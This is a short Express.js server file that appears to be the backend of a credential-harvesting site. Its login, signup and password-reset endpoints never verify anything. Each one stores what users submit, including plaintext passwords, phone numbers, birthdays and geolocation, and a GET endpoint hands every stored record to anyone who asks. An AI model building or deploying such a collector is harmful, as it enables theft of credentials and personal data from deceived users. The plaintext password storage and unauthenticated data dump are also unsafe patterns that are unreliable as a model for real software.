const express = require('express');
const { connectToDatabase } = require('./api/db');

const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.static(__dirname));

// POST /api/location
app.post('/api/location', async (req, res) => {
  const { latitude, longitude, accuracy, timestamp } = req.body;

  if (latitude == null || longitude == null) {
    return res.status(400).json({ error: 'latitude and longitude required' });
  }

  const { db } = await connectToDatabase();
  await db.collection('data').insertOne({
    type: 'location', latitude, longitude, accuracy, timestamp, receivedAt: new Date().toISOString()
  });

  console.log(`Location received: ${latitude}, ${longitude}`);
  res.json({ ok: true });
});

// POST /api/login
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: 'username and password required' });
  }

  const { db } = await connectToDatabase();
  await db.collection('data').insertOne({
    type: 'login', username, password, receivedAt: new Date().toISOString()
  });

  console.log(`Login received: ${username}`);
  res.json({ ok: true });
});

// POST /api/signup
app.post('/api/signup', async (req, res) => {
  const { mobile, fullName, username, password, birthday, gender } = req.body;

  if (!mobile || !fullName || !username || !password) {
    return res.status(400).json({ error: 'mobile, fullName, username, and password required' });
  }

  const { db } = await connectToDatabase();
  await db.collection('data').insertOne({
    type: 'signup', mobile, fullName, username, password, birthday, gender, receivedAt: new Date().toISOString()
  });

  console.log(`Signup received: ${username} (${mobile})`);
  res.json({ ok: true });
});

// POST /api/reset-password
app.post('/api/reset-password', async (req, res) => {
  const { identifier } = req.body;

  if (!identifier) {
    return res.status(400).json({ error: 'identifier required' });
  }

  const { db } = await connectToDatabase();
  await db.collection('data').insertOne({
    type: 'reset_password', identifier, receivedAt: new Date().toISOString()
  });

  console.log(`Reset password request: ${identifier}`);
  res.json({ ok: true });
});

// GET /api/locations
app.get('/api/locations', async (req, res) => {
  const { db } = await connectToDatabase();
  const data = await db.collection('data').find({}).sort({ receivedAt: -1 }).toArray();
  res.json(data);
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
